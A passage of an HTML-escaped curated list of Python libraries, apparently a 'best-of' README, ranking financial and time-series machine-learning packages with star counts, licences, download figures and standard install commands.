href=&#34;https://github.com/bashtage/arch&#34;&gt;arch&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 920) - ARCH models in Python. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=NCSA&#34;&gt;❗️NCSA&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/quantopian/alphalens&#34;&gt;Alphalens&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 2.3K · 💀) - Performance analysis of predictive (alpha) stock factors. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/quantopian/empyrical&#34;&gt;empyrical&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 920 · 💀) - Common financial risk and performance metrics. Used by zipline.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/gbeced/pyalgotrade&#34;&gt;PyAlgoTrade&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 3.7K · 💀) - Python Algorithmic Trading Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/peerchemist/finta&#34;&gt;FinTA&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.6K · 💤) - Common financial technical indicators implemented in Pandas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/37RvQcA&#34;&gt;❗️LGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kernc/backtesting.py&#34;&gt;Backtesting.py&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 2.5K) - Backtest trading strategies in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fmilthaler/FinQuant&#34;&gt;FinQuant&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 770 · 💀) - A program for financial portfolio management, analysis and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tradytics/surpriver&#34;&gt;surpriver&lt;/a&gt;&lt;/b&gt; (🥉12 · ⭐ 1.5K · 💀) - Find big moving stocks before they move using machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alvarobartt/pyrtfolio&#34;&gt;pyrtfolio&lt;/a&gt;&lt;/b&gt; (🥉7 · ⭐ 110 · 💀) - Python package to generate stock portfolios. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Time Series Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for forecasting, anomaly detection, feature extraction, and machine learning on time-series and sequential data.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alan-turing-institute/sktime&#34;&gt;sktime&lt;/a&gt;&lt;/b&gt; (🥇35 · ⭐ 5.3K) - A unified framework for machine learning with time series. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/alan-turing-institute/sktime&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 850 · 📥 76 · 📦 440 · 📋 1.2K - 35% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/alan-turing-institute/sktime&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sktime&#34;&gt;PyPi&lt;/a&gt; (📥 160K / month · 📦 23 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sktime&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sktime-all-extras&#34;&gt;Conda&lt;/a&gt; (📥 4K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sktime-all-extras&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebook/prophet&#34;&gt;Prophet&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 14K · 📈) - Tool for producing high quality forecasts for time series data that.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebook/prophet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 4.2K · 📥 650 · 📋 1.8K - 11% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebook/prophet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fbprophet&#34;&gt;PyPi&lt;/a&gt; (📥 1.4M / month · 📦 130 · ⏱️ 05.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fbprophet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/prophet&#34;&gt;Conda&lt;/a&gt; (📥 47K · ⏱️ 23.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge prophet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alkaline-ml/pmdarima&#34;&gt;pmdarima&lt;/a&gt;&lt;/b&gt; (🥇32 · ⭐ 1.2K) - A statistical library designed to fill the void in Pythons time series.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/alkaline-ml/pmdarima&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 20 · 🔀 210 · 📦 2.1K · 📋 280 - 9% open · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/alkaline-ml/pmdarima&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pmdarima&#34;&gt;PyPi&lt;/a&gt; (📥 1.2M / month · 📦 51 · ⏱️ 22.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pmdarima&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pmdarima&#34;&gt;Conda&lt;/a&gt; (📥 39K · ⏱️ 24.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pmdarima&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ourownstory/neural_prophet&#34;&gt;NeuralProphet&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.3K) - NeuralProphet: A simple forecasting package. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ourownstory/neural_prophet&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 19 · 🔀 280 · 📦 82 · 📋 270 - 26% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ourownstory/neural_prophet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/neuralprophet&#34;&gt;PyPi&lt;/a&gt; (📥 73K / month · ⏱️ 22.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install neuralprophet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tslearn-team/tslearn&#34;&gt;tslearn&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2.1K) - A machine learning toolkit dedicated to time-series data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tslearn-team/tslearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 270 · 📦 490 · 📋 270 - 32% open · ⏱️ 06.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tslearn-team/tslearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tslearn&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 19 · ⏱️ 16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tslearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tslearn&#34;&gt;Conda&lt;/a&gt; (📥 250K · ⏱️ 15.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tslearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jdb78/pytorch-forecasting&#34;&gt;pytorch-forecasting&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 2K) - Time series forecasting with PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jdb78/pytorch-forecasting&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 320 · 📋 470 - 46% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jdb78/pytorch-forecasting&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pytorch-forecasting&#34;&gt;PyPi&lt;/a&gt; (📥 62K / month · 📦 4 · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pytorch-forecasting&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pytorch-forecasting&#34;&gt;Conda&lt;/a&gt; (📥 19K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pytorch-forecasting&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/blue-yonder/tsfresh&#34;&gt;tsfresh&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 6.4K) - Automatic extraction of relevant features from time series:. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/blue-yonder/tsfresh&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 82 · 🔀 970 · 📋 480 - 8% open · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/blue-yonder/tsfresh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tsfresh&#34;&gt;PyPi&lt;/a&gt; (📥 410K / month · 📦 55 · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tsfresh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tsfresh&#34;&gt;Conda&lt;/a&gt; (📥 170K · ⏱️ 21.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tsfresh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/unit8co/darts&#34;&gt;Darts&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 4.1K · 📉) - A python library for easy manipulation and forecasting of time.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/unit8co/darts&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 53 · 🔀 410 · 📦 57 · 📋 460 - 35% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/unit8co/darts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/u8darts&#34;&gt;PyPi&lt;/a&gt; (📥 11K / month · 📦 2 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install u8darts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/u8darts-all&#34;&gt;Conda&lt;/a&gt; (📥 4.3K · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge u8darts-all&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/unit8/darts&#34;&gt;Docker Hub&lt;/a&gt; (📥 340 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull unit8/darts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/TDAmeritrade/stumpy&#34;&gt;STUMPY&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.3K) - STUMPY is a powerful and scalable Python library for modern time series.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/TDAmeritrade/stumpy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 220 · 📋 320 - 11% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/TDAmeritrade/stumpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/stumpy&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 4 · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install stumpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/stumpy&#34;&gt;Conda&lt;/a&gt; (📥 39K · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge stumpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/awslabs/gluon-ts&#34;&gt;GluonTS&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.7K) - Probabilistic time series modeling in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/awslabs/gluon-ts&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 86 · 🔀 560 · 📋 730 - 40% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/awslabs/gluon-ts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gluonts&#34;&gt;PyPi&lt;/a&gt; (📥 85K / month · 📦 6 · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gluonts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/gluonts&#34;&gt;Conda&lt;/a&gt; (📥 34 · ⏱️ 14.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda gluonts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/johannfaouzi/pyts&#34;&gt;pyts&lt;/a&gt;&lt;/b&gt; (🥈25 · ⭐ 1.3K) - A Python package for time series classification. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/johannfaouzi/pyts&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 130 · 📦 200 · 📋 61 - 57% open · ⏱️ 02.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/johannfaouzi/pyts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyts&#34;&gt;PyPi&lt;/a&gt; (📥 140K / month · 📦 11 · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyts&#34;&gt;Conda&lt;/a&gt; (📥 11K · ⏱️ 31.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/python-streamz/streamz&#34;&gt;Streamz&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.1K) - Real-time stream processing for python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/python-streamz/streamz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 45 · 🔀 130 · 📦 290 · 📋 250 - 41% open · ⏱️ 24.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/python-streamz/streamz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/streamz&#34;&gt;PyPi&lt;/a&gt; (📥 13K / month · 📦 29 · ⏱️ 04.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install streamz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/streamz&#34;&gt;Conda&lt;/a&gt; (📥 300K · ⏱️ 04.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge streamz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Nixtla/statsforecast&#34;&gt;StatsForecast&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 670 · 🐣) - Lightning fast forecasting with statistical and econometric.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Nixtla/statsforecast&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 9 · 🔀 41 · 📋 40 - 32% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Nixtla/statsforecast&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/statsforecast&#34;&gt;PyPi&lt;/a&gt; (📥 47K / month · 📦 3 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install statsforecast&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/statsforecast&#34;&gt;Conda&lt;/a&gt; (📥 4.3K · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge statsforecast&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/linkedin/greykite&#34;&gt;greykite&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 1.5K) - A flexible, intuitive and fast forecasting library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/linkedin/greykite&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 7 · 🔀 68 · 📦 9 · 📋 61 - 14% open · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/linkedin/greykite&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/greykite&#34;&gt;PyPi&lt;/a&gt; (📥 53K / month · ⏱️ 15.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install greykite&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/fraunhoferportugal/tsfel&#34;&gt;TSFEL&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 500) - An intuitive library to extract features from time series. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/fraunhoferportugal/tsfel&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 65 · 📦 36 · 📋 50 - 14% open · ⏱️ 16.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/fraunhoferportugal/tsfel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tsfel&#34;&gt;PyPi&lt;/a&gt; (📥 4.6K / month · ⏱️ 14.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tsfel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/AutoViML/Auto_TS&#34;&gt;Auto TS&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 430) - Automatically build ARIMA, SARIMAX, VAR, FB Prophet and XGBoost.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/AutoViML/Auto_TS&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 80 · 📋 72 - 13% open · ⏱️ 13.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/AutoViML/Auto_TS&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/auto-ts&#34;&gt;PyPi&lt;/a&gt; (📥 1.2K / month · ⏱️ 